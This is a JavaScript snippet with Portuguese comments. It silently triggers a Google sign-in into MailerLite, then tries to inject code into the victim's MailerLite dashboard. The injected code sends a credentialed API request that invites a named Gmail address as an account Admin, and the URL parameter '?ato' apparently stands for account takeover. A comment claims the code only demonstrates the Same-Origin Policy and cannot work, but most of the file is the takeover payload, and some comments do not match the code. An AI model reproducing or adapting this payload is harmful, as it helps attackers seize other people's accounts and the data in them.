// Primeiro timeout: após 1 segundo, redireciona para o Google Auth
setTimeout(function() {
    if (window.top.location.search == "start") {
        window.top.open("https://accounts.google.com/o/oauth2/v2/auth?as=AKF4tMmt3F52VXAA2Fq_tzFAUy9PRbyAzPqfTtLvsYI&client_id=588658642171-uatqq7pju7oriee4dhnno0f8oeekc047.apps.googleusercontent.com&scope=openid%20email%20profile&response_type=id_token&gsiwebsdk=gis_attributes&redirect_uri=https%3A%2F%2Faccounts.mailerlite.com%2Fauth%2Fgoogle%2Fcallback&response_mode=form_post&display=page&prompt=none&gis_params=Ch9odHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tEjRodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tL2F1dGgvZ29vZ2xlL2NhbGxiYWNrGAciEGMyZGNiZDYwOGQzMTE4MzkqK0FLRjR0TW10M0Y1MlZYQUEyRnFfdHpGQVV5OVBSYnlBelBxZlR0THZzWUkySDU4ODY1ODY0MjE3MS11YXRxcTdwanU3b3JpZWU0ZGhubm8wZjhvZWVrYzA0Ny5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbTgCWiBodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tLw");
        }
}, 3000);

/*
================================================================
AVISO IMPORTANTE: 
Este código NÃO VAI FUNCIONAR como esperado.
Ele é apenas uma representação de como seria a sintaxe se os 
navegadores não tivessem barreiras de segurança (Same-Origin Policy).
A execução deste código irá gerar um erro de segurança no console.
================================================================
*/

// Primeiro timeout: após 6 segundos, abre a nova janela
setTimeout(function() {
    if (window.top.location.search == "?start") {
        
        console.log("Abrindo a nova janela para o MailerLite...");
        
        // 1. Abre a nova janela e guarda uma referência a ela na variável 'novaJanela'
        const novaJanela = window.top.open("https://dashboard.mailerlite.com/products/168076388836836860/checkout/edit?ato");

        // 2. Tenta verificar a URL da nova janela a partir da janela original
        // !! ESTA PARTE VAI FALHAR E GERAR UM ERRO DE SEGURANÇA !!
        try {
            // A verificação é feita na variável 'novaJanela' que acabamos de criar.
            // O navegador vai bloquear a leitura de 'novaJanela.location' aqui.
            if (novaJanela && novaJanela.location.search.includes("?ato")) {
                
                // ESTE TRECHO NUNCA SERÁ EXECUTADO
                console.log("Sucesso! A nova janela tem '?ato'. Agendando o fetch. (Esta mensagem nunca aparecerá)");
                
                // Se fosse possível, a lógica para executar o fetch na outra janela seria algo assim,
                // mas isso também seria bloqueado por segurança.
                novaJanela.eval(`
                    setTimeout(function() {
                        console.log('Executando o fetch na janela do MailerLite');
                                    fetch('https://dashboard.mailerlite.com/api/invites', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json, text/plain, */*',
                    'X-Xsrf-Token': xsrfToken,
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-Acc-Id': accountId
                },
                body: JSON.stringify({
                    role: "Admin",
                    permissions: [],
                    campaigns: [],
                    requires_periodic_password_change: true,
                    email: "gustavoribeirounic@gmail.com",
                }),
                credentials: 'include'
            });
                    }, 4000);
                `);

            } else {
                 // ESTE TRECHO TAMBÉM NÃO SERÁ EXECUTADO, POIS O ERRO ACONTECE ANTES
                 console.log("A URL da nova janela não pôde ser lida ou não contém '?ato'.");
            }

        } catch (e) {
            // 3. O código vai pular diretamente para este bloco de erro.
            console.error("ERRO CAPTURADO! O navegador bloqueou o acesso à nova janela como esperado.");
            console.error("Isso demonstra a 'Same-Origin Policy' em ação.");
            console.error("Detalhes do erro:", e);
        }
    }
}, 6000);
